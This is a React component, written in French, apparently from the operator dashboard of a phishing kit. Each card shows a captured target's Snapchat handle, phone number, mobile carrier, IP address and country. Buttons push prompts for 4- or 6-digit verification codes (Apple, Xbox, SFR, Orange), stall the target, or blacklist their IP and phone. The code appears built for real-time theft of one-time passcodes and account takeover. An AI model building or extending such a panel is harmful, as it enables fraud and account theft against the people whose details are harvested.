import { useState } from "react";
import { motion } from "framer-motion";
import { Send, Hash, Ban, Clock, X, Ghost, Phone, MapPin, Globe } from "lucide-react";
import { base44 } from "@/api/base44Client";

const operatorBadge = {
  SFR: "bg-red-500/15 text-red-400 border-red-500/30",
  Bouygues: "bg-blue-500/15 text-blue-400 border-blue-500/30",
  Orange: "bg-orange-400/15 text-orange-400 border-orange-400/30",
};

export default function SubmissionActions({ sub, discord, onDone }) {
  const [busy, setBusy] = useState(null);
  const [result, setResult] = useState("");

  const runAction = async (action) => {
    setBusy(action);
    setResult("");
    try {
      const res = await base44.functions.invoke("sendCode", { submissionId: sub.id, action, discord });
      if (res?.data?.discord_required) {
        setResult("Identification Discord requise");
      } else {
        setResult("Action envoyée ✓");
        setTimeout(() => onDone?.(), 1200);
      }
    } catch (err) {
      setResult(err?.response?.data?.error || "Échec de l'action");
    }
    setBusy(null);
  };

  const runBlacklist = async () => {
    setBusy("blacklist");
    setResult("");
    try {
      await base44.functions.invoke("blacklistUser", {
        ip: sub.ip_address,
        telephone: sub.telephone,
        submissionId: sub.id,
      });
      await base44.functions.invoke("sendCode", { submissionId: sub.id, action: "wrong", discord }).catch(() => {});
      setResult("Blacklisté ✓");
      setTimeout(() => onDone?.(), 1200);
    } catch (err) {
      setResult(err?.response?.data?.error || "Échec");
    }
    setBusy(null);
  };

  const actions = [
    { key: "code_ready", label: "Code 4 (Apple)", icon: Send, color: "bg-primary text-primary-foreground" },
    { key: "code6", label: "Code 6 (Xbox)", icon: Hash, color: "bg-purple-500 text-white" },
    { key: "code6sfr", label: "Code 6 (SFR)", icon: Hash, color: "bg-red-500 text-white" },
    { key: "code6orange", label: "Code 6 (Orange)", icon: Hash, color: "bg-orange-500 text-white" },
    { key: "wrong", label: "Mauvais numéro", icon: X, color: "bg-destructive text-destructive-foreground" },
    { key: "wait", label: "Faire patienter", icon: Clock, color: "bg-blue-500 text-white" },
  ];

  return (
    <motion.div
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      className="bg-card border border-primary/30 rounded-2xl p-4 shadow-xl"
    >
      <div className="flex flex-wrap items-center gap-2 mb-3">
        <span className={`px-2.5 py-1 rounded-full border text-[11px] font-bold ${operatorBadge[sub.operateur]}`}>
          {sub.operateur}
        </span>
        <span className="flex items-center gap-1 text-sm font-semibold text-foreground">
          <Ghost className="w-4 h-4 text-muted-foreground" />
          {sub.snapchat}
        </span>
        <span className="flex items-center gap-1 text-sm text-muted-foreground font-mono">
          <Phone className="w-3.5 h-3.5" />
          {sub.telephone}
        </span>
      </div>
      <div className="flex flex-wrap gap-x-4 gap-y-1 text-xs text-muted-foreground mb-4">
        {sub.ip_address && (
          <span className="flex items-center gap-1">
            <MapPin className="w-3 h-3" />
            {sub.ip_address}
          </span>
        )}
        {sub.country && sub.country !== "Inconnue" && (
          <span className="flex items-center gap-1">
            <Globe className="w-3 h-3" />
            {sub.country}
          </span>
        )}
      </div>
      <div className="grid grid-cols-2 gap-2">
        {actions.map((a) => {
          const Icon = a.icon;
          return (
            <button
              key={a.key}
              onClick={() => runAction(a.key)}
              disabled={!!busy}
              className={`flex items-center gap-2 px-3 py-2.5 rounded-xl text-xs font-bold ${a.color} hover:opacity-90 transition-opacity disabled:opacity-50`}
            >
              {busy === a.key ? (
                <span className="w-3.5 h-3.5 border-2 border-white/40 border-t-white rounded-full animate-spin" />
              ) : (
                <Icon className="w-3.5 h-3.5" />
              )}
              {a.label}
            </button>
          );
        })}
        <button
          onClick={runBlacklist}
          disabled={!!busy}
          className="col-span-2 flex items-center justify-center gap-2 px-3 py-2.5 rounded-xl text-xs font-bold bg-red-900 text-red-100 border border-red-700/50 hover:bg-red-800 transition-colors disabled:opacity-50"
        >
          {busy === "blacklist" ? (
            <span className="w-3.5 h-3.5 border-2 border-white/40 border-t-white rounded-full animate-spin" />
          ) : (
            <Ban className="w-3.5 h-3.5" />
          )}
          Blacklist instant
        </button>
      </div>
      {result && <p className="text-center text-xs mt-3 text-muted-foreground">{result}</p>}
    </motion.div>
  );
}